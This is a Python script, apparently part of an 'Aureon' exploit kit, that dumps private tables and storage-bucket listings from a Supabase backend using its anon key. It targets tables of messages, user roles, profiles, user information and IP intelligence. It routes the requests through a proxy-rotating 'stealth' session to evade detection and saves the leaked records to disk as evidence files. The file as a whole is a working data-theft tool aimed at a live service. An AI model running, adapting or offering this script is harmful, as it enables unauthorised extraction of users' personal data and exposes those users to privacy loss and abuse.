import requests
import json
import os
import time
import sys

# Import Stealth Module
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
from Stealth_Manager import StealthSession
from dotenv import load_dotenv
from data_models import Finding, FindingType
from enum import Enum
import logging

load_dotenv()

# Initialize Stealth Session
stealth = StealthSession(proxy_file="proxies.txt")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class EnhancedJSONEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, Finding):
            from dataclasses import asdict
            return asdict(o)
        if isinstance(o, Enum):
            return o.value
        return super().default(o)

# Configuration
SUPABASE_URL = os.getenv("SUPABASE_URL")
ANON_KEY = os.getenv("ANON_KEY")

HEADERS = {
    "apikey": ANON_KEY,
    "Authorization": f"Bearer {ANON_KEY}",
    "Content-Type": "application/json"
}

# Update Headers in Stealth Session
stealth.session.headers.update(HEADERS)

OUTPUT_DIR = os.path.join("output", "Aureon", "Evidence")
os.makedirs(OUTPUT_DIR, exist_ok=True)

TARGET_TABLES = [
    "public_strategies",
    "trading_signals",
    "messages",
    "user_roles",
    "user_known_information",
    "nomad_ip_intelligence",
    "profiles"
]

def dump_table(table_name):
    logging.info(f"Dumping table: {table_name}...")
    url = f"{SUPABASE_URL}/rest/v1/{table_name}?select=*"
    findings = []
    
    try:
        response = stealth.get(url)
        if response.status_code == 200:
            data = response.json()
            count = len(data)
            logging.info(f"Success! Found {count} records in {table_name}.")
            
            if count > 0:
                filename = os.path.join(OUTPUT_DIR, f"{table_name}_dump.json")
                with open(filename, "w", encoding='utf-8') as f:
                    json.dump(data, f, indent=2, cls=EnhancedJSONEncoder)
                logging.info(f"Saved to {filename}")
                
                finding = Finding(
                    value=f"Leaked records from table: {table_name}",
                    type=FindingType.SENSITIVE_DATA,
                    source_module="Aureon_Exploit_Kit",
                    target=url,
                    confidence=1.0,
                    metadata={"record_count": count, "sample": data[0], "dump_file": filename}
                )
                findings.append(finding)
            else:
                logging.info(f"Table {table_name} is empty.")
        else:
            logging.error(f"Failed to dump table {table_name}. Status: {response.status_code} - {response.text}")
            
    except Exception as e:
        logging.error(f"Error dumping table {table_name}: {e}")
    return findings

def check_bucket(bucket_name):
    logging.info(f"Checking Storage Bucket: {bucket_name}...")
    url = f"{SUPABASE_URL}/storage/v1/object/list/{bucket_name}"
    findings = []
    try:
        # Use stealth.post
        response = stealth.post(url, json={"prefix": "", "limit": 100, "offset": 0, "sortBy": {"column": "name", "order": "asc"}})
        if response.status_code == 200:
            data = response.json()
            count = len(data)
            logging.info(f"Success! Found {count} files in bucket {bucket_name}.")
            if count > 0:
                filename = os.path.join(OUTPUT_DIR, f"{bucket_name}_storage_list.json")
                with open(filename, "w", encoding='utf-8') as f:
                    json.dump(data, f, indent=2, cls=EnhancedJSONEncoder)
                logging.info(f"Saved file list to {filename}")
                
                finding = Finding(
                    value=f"Publicly listable files in storage bucket: {bucket_name}",
                    type=FindingType.SENSITIVE_DATA,
                    source_module="Aureon_Exploit_Kit",
                    target=url,
                    confidence=0.8,
                    metadata={"file_count": count, "sample_files": data[:5], "dump_file": filename}
                )
                findings.append(finding)
        else:
             logging.error(f"Failed to list bucket {bucket_name}. Status: {response.status_code} - {response.text}")
    except Exception as e:
        logging.error(f"Error checking bucket {bucket_name}: {e}")
    return findings

def main():
    logging.info("Starting Aureon Data Extraction...")
    logging.info(f"Target: {SUPABASE_URL}")
    logging.info(f"Output Directory: {OUTPUT_DIR}")
    
    all_findings = []
    
    for table in TARGET_TABLES:
        all_findings.extend(dump_table(table))
        time.sleep(1) # Be polite
    
    all_findings.extend(check_bucket("avatars"))
    all_findings.extend(check_bucket("user-storage"))

    if all_findings:
        findings_filename = os.path.join("output", "Aureon", "aureon_findings.json")
        os.makedirs(os.path.dirname(findings_filename), exist_ok=True)
        with open(findings_filename, "w", encoding='utf-8') as f:
            json.dump(all_findings, f, indent=2, cls=EnhancedJSONEncoder)
        logging.info(f"All {len(all_findings)} findings saved to {findings_filename}")
    else:
        logging.info("No findings were discovered.")

if __name__ == "__main__":
    main()
